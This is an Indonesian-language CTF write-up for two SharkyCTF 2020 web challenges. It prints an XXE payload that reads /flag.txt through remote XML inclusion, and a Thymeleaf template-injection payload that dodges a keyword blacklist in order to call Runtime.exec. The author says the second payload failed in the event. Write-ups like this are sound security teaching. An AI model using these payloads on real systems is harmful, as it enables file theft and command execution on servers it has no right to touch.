# SharkyCTF 2020
It's like a half year ago since my last writeup in my Github. Please enjoy my writeup of SharkyCTF after playing with HCS (Heroes Cyber Security).

## XXEternalXX
**Deskripsi**
> One of your customer all proud of his new platform asked you to audit it. To show him that you can get information on his server, he hid a file "flag.txt" at the server's root.

> [xxexternalxx.sharkyctf.xyz](xxexternalxx.sharkyctf.xyz)

**Pembahasan**
Dari judulnya bisa ditebak ini akan menggunakan XXE (**XXE**ternal). Maka coba kita cek :

![](https://raw.githubusercontent.com/kerupuksambel/ctf-writeup/master/SharkyCTF_2020/xxeternalxx/1.png)

Saat mengecek link yang diarahkan oleh web, ternyata XML yang diberikan berasal dari include dari web tersebut [http://xxexternalxx.sharkyctf.xyz/?xml=data.xml](http://xxexternalxx.sharkyctf.xyz/?xml=data.xml). Saya mencurigai adanya vuln RFI (Remote File Inclusion) disini, sehingga saya membuat payload di [https://gist.githubusercontent.com/kerupuksambel/6b8a876ce9fb3b9ebf285af9b15a57b3/raw/38db37b86c3296d078743a998a8793b85a8eeaf5/exploit](gist) ini.

```
<?xml version="1.0" ?>
<!DOCTYPE data [
    <!ENTITY amber SYSTEM "file:///flag.txt">
]>

<root>
  <data>
    &amber;
  </data>
</root>

```

Saya menggunakan payload yang bersumber dari [https://github.com/RihaMaheshwari/XXE-Injection-Payloads](RihaMaheshwari) dan memodifikasinya sedikit agar strukturnya sesuai dengan data.xml dari web. Lalu, include payload lewat parameter GET dengan memanfaatkan vuln RFI.

[http://xxexternalxx.sharkyctf.xyz/?xml=https://gist.githubusercontent.com/kerupuksambel/6b8a876ce9fb3b9ebf285af9b15a57b3/raw/38db37b86c3296d078743a998a8793b85a8eeaf5/exploit](http://xxexternalxx.sharkyctf.xyz/?xml=https://gist.githubusercontent.com/kerupuksambel/6b8a876ce9fb3b9ebf285af9b15a57b3/raw/38db37b86c3296d078743a998a8793b85a8eeaf5/exploit)

![](https://raw.githubusercontent.com/kerupuksambel/ctf-writeup/master/SharkyCTF_2020/xxeternalxx/flag.png)

Flag : `shkCTF{G3T_XX3D_f5ba4f9f9c9e0f41dd9df266b391447a}`

## WebFugu

**Deskripsi**
> A new site listing the different species of fugu fish has appeared on the net. Used by many researchers, it is nevertheless vulnerable. Find the vulnerability and exploit it to recover some of the website configuration.

> Creator: MasterFox

> [http://webfugu.sharkyctf.xyz](http://webfugu.sharkyctf.xyz)

**Pembahasan**
*Dikarenakan sejauh ini platform untuk WebFugu sedang down, saya tidak bisa menginclude flag dan screenshot di PoC saya. Mohon maaf~*

Pada awalnya saya sempat kebingungan dengan WebFugu ini, namun salah seorang teman di HCS berhasil mendapatkan vulnerabilitynya yaitu berupa SSTI di Thymeleaf di `/process` yang digunakan oleh Webfugu. Terburu-buru ingin mendapat flag, saya langsung berusaha mencari celah RCE untuk mendapat flag yang mungkin didapat di root. Pertama saya membuat payload untuk menciptakan shell berupa memanggil `Java.lang.Runtime` untuk memanggil fungsi getRuntime dan memanggil perintah shell. Namun ternyata keyword `Java` dan `Runtime` diblacklist sehingga saya harus memanggil cara lain.

Stuck berjam-jam, akhirnya dengan link [https://stackoverflow.com/questions/30933776/display-a-variable-inside-another-with-thymeleaf](ini), saya bisa membuat payload yang (harusnya) berfungsi untuk memanggil perintah shell. Payload yang saya gunakan adalah 

`<div th:text=${__('T(ja'+'va.lang.Runt'+'ime).getRun'+'time().exec("ls")')__}></div>`

Namun saat dijalankan, ternyata masih error juga. Agak frustasi, saya menghubungi panitia SharkyCTF di Discord dan secara cukup mengejutkan, ia mengatakan bahwa kita tidak perlu melakukan RCE untuk mendapat flag.

:o

Setelah lelah dengan mencari celah yang tersedia, saya iseng mencoba `{{flag}}`. Dan ternyata, diketahui bahwa `{{flag}}` memang mengandung suatu variable valid dan didapati bahwa di variable tersebut ada satu attribute `content`. Mencoba `{{flag.content}}` akan mengembalikan flagnya.

Flag : -

~~AAAAAAAAAAAAAAAAAAAAAAAA kadung stres a~~

